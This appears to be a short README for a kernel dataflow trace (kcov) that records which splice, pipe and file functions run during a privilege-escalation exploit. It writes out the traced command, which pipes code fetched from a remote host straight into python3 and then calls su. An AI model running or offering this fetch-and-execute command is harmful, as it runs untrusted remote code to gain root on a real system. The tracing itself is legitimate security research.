# copy.fail — kcov-dataflow trace of `curl | python3 && su`

## Command Traced

```bash
curl https://copy.fail/exp | python3 && su
```

## What Was Captured

- **524,287 words** in the ring buffer (buffer full — 512K capacity)
- **131,071 records** dumped
- Kernel functions in `fs/splice.o`, `fs/pipe.o`, `fs/open.o`, `fs/read_write.o`

## Method

Used `kcov_df_fork_trace` (fork-intercepting wrapper) which:
1. Opens `/sys/kernel/debug/kcov_dataflow`
2. Allocates shared mmap buffer
3. Enables recording for parent task
4. `fork()` → child re-enables on inherited fd → `exec(python3 exploit.py)`
5. Parent waits, then dumps the shared buffer

## Files

- `trace.txt` — 131K records of ENTRY/RET with PC, arg_idx, size, value
- `kallsyms.txt` — kernel symbol table for address resolution
- `summary.txt` — symbolized top functions and first 50 entries
